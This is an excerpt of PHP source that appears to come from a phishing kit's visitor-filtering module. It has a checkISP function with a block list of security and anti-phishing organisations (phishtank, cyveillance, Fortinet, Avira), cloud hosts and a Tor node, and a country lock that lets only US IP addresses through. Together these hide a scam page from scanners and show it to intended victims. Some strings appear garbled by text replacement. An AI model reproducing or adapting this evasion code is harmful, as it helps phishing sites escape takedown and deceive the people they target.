<?php
    ...
    class Pullers extends Modernized
    {
        private $rangePath;
        function __construct()
        {
            if(file_exists("Vendor/Gradle/heart.txt")) {
                $this->rangePath = "Vendor/Gradle/heart.txt";
            }elseif(file_exists("../Vendor/Gradle/heart.txt")) {
                $this->rangePath = "../Vendor/Gradle/heart.txt";
            }elseif(file_exists("../../Vendor/Gradle/heart.txt")) {
                $this->rangePath = "../../Vendor/Gradle/heart.txt";
            }  
        ...
        public function checkISP() {
            $badISPs = array(
                ...
                'Modernizedlete Internet Access',
                'london-tor.mooo.com',
                'amazonaws',
                'cyveillance',
                'phishtank',
                ...
                'Modernizeduter Problem Solving',
                'Fortinet',
                'Avira',
                'Rackspace',
                'Baidu',
        ...
        $LockCountry = 'US';
    if ($this->localhost($this->getIP())) {
                if (json_decode($this->curlX("https://extreme-ip-lookup.com/json/1.33.213.231"), true)['countryCode'] == $LockCountry) {
                    return 1;
                }
                return 0;
            } else {
                if(json_decode($this->curlX("https://extreme-ip-lookup.com/json/" . $this->getIP()), true)['countryCode'] == $LockCountry) {
                    return 1;
                }
                return 0;
            }
    ...
    class Spider extends Modernized
    {
